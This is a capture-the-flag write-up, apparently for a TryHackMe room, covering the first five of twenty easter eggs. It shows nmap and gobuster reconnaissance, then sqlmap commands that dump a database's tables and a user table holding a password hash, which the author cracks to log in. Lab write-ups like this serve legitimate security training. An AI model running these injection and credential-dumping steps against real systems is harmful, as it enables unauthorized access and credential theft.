<img width="466" alt="banner" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/b4e79fb0-cd41-4824-9543-bec3bccac452">
<p></p>
-------------------------------------------------
<p></p>
Welcome to another THM writeup. This room was designed by <a href="https://tryhackme.com/p/DesKel">DesKel</a> for sharpening our CTF's skillz. We must find all 20 easter eggs. So let's get starter!

First run our nmap scan.
<code> nmap -A -T5 -p- targetIP</code>
<p></p>
Result's states that there's only two port's open:
<code>
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
</code>
<p></p>
Let's go to our browser. On port 80 we saw a little-bit wacky page - so here we must find all the egg's.

<h2>Egg 1</h2>
Hint: check the robots


<img width="960" alt="robots xtx" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/693f25fa-a6b5-40bc-b43f-8e17c6f5dd74">
<p></p>
After decoding hex vaules we've got first flag!

<h2>Egg 2</h2>
Hint: Decode the base64 multiple times. Don’t forget there are something being encoded.
According to hint, we must decode b64 value that we foud in robots.txt after decoding we receive: "DesKel_secret_base", that looks like directory. Let;s go to that page and we've got the second egg!
<p></p>
<h2>Egg 3</h2>
Hint: Directory buster with common.txt might help.
<p></p>
For this task I've used gobuster:

<code>gobuster dir -u http://TargetIP -w /user/share/wordlists/dirb/common.txt</code>
Gobuster found /login directory that conyains our third egg!

<h2>Egg 4</h2>
Hint: time-based sqli

It sound like task for SqlMap! First let's intercept POST request in Burp suite and save it as xml file, next we'll use SqlMap:
<code>sqlmap -r OurRequest.xml --current-db</code>

After finding out what our databes is called, we try to read the tables:
<code>sqlmap -r OurRequest.xml -D THM_f0und_m3 --tables</code>

we've got two tables:

<code>
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+
</code>
we must go deeper:
<code>sqlmap -r OurRequest.xml -D THM_f0und_m3 -T nothing_inside --columns</code>
result:
<code>
Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+
</code>
Finally we've got the fourth egg!
<code>sqlmap -r OurRequest.xml -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"</code>


<h2>Egg 5</h2>
Hint: Another sqli

<code>sqlmap -r OurRequest.xml -D THM_f0und_m3 -T user --columns</code>
<code>
Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+
</code>

<code>sqlmap -r OurRequest.xml-D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"</code>

<code>select username,password from user [2]:
[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
[*] Skidy, He is a nice guy, say hello for me</code>

After quick goole search we've got hash value and DesKel password! So let's login and receive egg 5!
